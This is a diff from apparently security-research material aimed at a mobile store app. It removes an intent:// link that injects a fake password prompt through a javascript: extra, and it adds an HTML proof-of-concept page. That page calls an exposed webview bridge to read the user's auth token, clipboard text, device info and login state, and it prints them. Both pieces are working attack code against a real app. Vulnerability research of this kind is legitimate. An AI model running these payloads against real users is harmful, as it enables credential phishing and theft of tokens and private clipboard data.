@@ -1,9 +1,35 @@
-<a href="
-  intent://host/path#Intent;
-  scheme=https;
-  package=com.realmestore.app;
-  S.extra_key_param=javascript:prompt(Please Enter Your Password To Continue);
-  end">
-  Open in app
-</a>
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Bridge PoC</title></head>
+<body>
+<h1>BridgePoC</h1>
+<pre id="out"></pre>
+<script>
+function log(msg) {
+    const o = document.getElementById('out');
+    o.textContent += msg + '\n';
+}
 
+function tryCall(name, fn) {
+    try {
+        const v = fn();
+        log(name + ': ' + JSON.stringify(v));
+    } catch (e) {
+        log(name + ' error: ' + e);
+    }
+}
+
+if (typeof BridgeCommonApi !== 'undefined') {
+    log('BridgeCommonApi available');
+    tryCall('getToken', () => BridgeCommonApi.getToken());
+    tryCall('getClipboardText', () => BridgeCommonApi.getClipboardText());
+    tryCall('getDeviceInfo', () => BridgeCommonApi.getDeviceInfo());
+    tryCall('getAppInfo', () => BridgeCommonApi.getAppInfo());
+    tryCall('isLogin', () => BridgeCommonApi.isLogin());
+    // Do not call destructive APIs.
+} else {
+    log('BridgeCommonApi NOT available');
+}
+</script>
+</body>
+</html>
